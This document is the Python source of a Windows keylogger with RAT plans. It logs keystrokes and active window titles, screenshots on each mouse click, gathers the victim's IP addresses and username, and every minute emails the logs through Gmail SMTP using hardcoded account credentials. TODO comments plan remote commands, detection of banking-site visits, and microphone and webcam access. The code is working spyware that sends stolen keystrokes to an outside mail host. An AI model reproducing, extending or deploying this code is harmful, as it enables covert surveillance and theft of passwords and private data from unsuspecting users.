# Third Party Modules
from pynput.keyboard import Listener as k_Listener
from pynput.mouse import Listener as m_Listener
from pyscreenshot import grab
import win32gui  # To get active window name

# Standard Modules
import os
import time
import requests
import socket
import random
import threading
import smtplib  # To send an email

# User Defined Modules
import LogModel
import UserModel

# TODO RAT - Give commands based on keyword
# TODO RAT - Request Log On Demand
# TODO RAT - Request ScreenShot On Demand

# TODO If User on apps such as, chrome take a screenshot
# TODO Detect if user visited a banking site

# TODO Improve key logging logic
# TODO Encrypt txt file

# TODO Improve screenshot logic
# TODO compress screenshots then upload them

# TODO Improve email logic
# TODO Send txt file as an email, then delete it

# TODO Microphone Access
# TODO Webcam Access

datetime = time.ctime(time.time())

# Create instance of the UserModel class
User = UserModel.UserModel(public_IP=requests.get('https://api.ipify.org/').text,
                           private_IP=socket.gethostbyname(socket.gethostname()),
                           user=os.path.expanduser('~').split('\\')[2],
                           )

# Define document info schema
msg_Schema = f'[START OF LOGS]\n   Date/Time: {datetime}\n   User-Profile: {User.user}\n   ' \
             f'Public-IP: {User.public_IP}\n    Private-IP: {User.private_IP}\n\n '

# Create instance of the LogModel class
Log = LogModel.LogModel(logOwner=msg_Schema, logText=[], logHeader=[])

# To store previously active application
old_app = ''
old_file = ''


def log_data(key):
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())  # Get name of active window

    # If user switch app, add to log
    if new_app != old_app and new_app != '':
        Log.logHeader.append(f'\n[{datetime}] ~ {new_app}\n')
        Log.logText.append('\u26E7')
        old_app = new_app
    else:
        pass

    # Change default key names to more readable one
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    key = str(key).strip('\'')
    if key in substitution:
        Log.logText.append(substitution[substitution.index(key) + 1])
    else:
        Log.logText.append(key)


def write_file():
    global old_file

    filepath = os.path.expanduser('~') + '/Downloads/'
    filename = User.user + str(random.randint(11111, 99999)) + '.txt'
    file = filepath + filename

    if os.path.exists(old_file):
        os.remove(old_file)
    else:
        print("The file does not exist")

    old_file = file

    with open(file, 'w') as fp:
        fp.write(Log.toString())
        send_email()
    print('written all good')


def save_screenshot(x, y, button, pressed):

    if pressed:
        im = grab()
        im.save(os.path.expanduser('~') + '/Downloads/' + str(random.randint(11111, 99999)) + '.jpeg')


def send_email():
    sender_email = "firstdjin@gmail.com"
    receiver_email = "firstdjin@gmail.com"
    password = "djin1234"
    message = Log.toString().encode()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message)


def send_logs():
    previous_log_text = ''
    previous_log_header = ''

    while True:

        time.sleep(60)

        if len(Log.logText) > 1 and \
                (''.join(Log.logText) != previous_log_text or ''.join(Log.logHeader) != previous_log_header):
            previous_log_text = ''.join(Log.logText)
            previous_log_header = ''.join(Log.logHeader)
            write_file()


def key_logger():
    with k_Listener(on_press=log_data) as k_listen:
        try:
            k_listen.join()
        except:
            pass


def screen_logger():
    with m_Listener(on_click=save_screenshot) as m_listen:
        try:
            m_listen.join()
        except:
            pass


if __name__ == '__main__':
    threading.Thread(target=key_logger).start()
    threading.Thread(target=screen_logger).start()
    threading.Thread(target=send_logs).start()
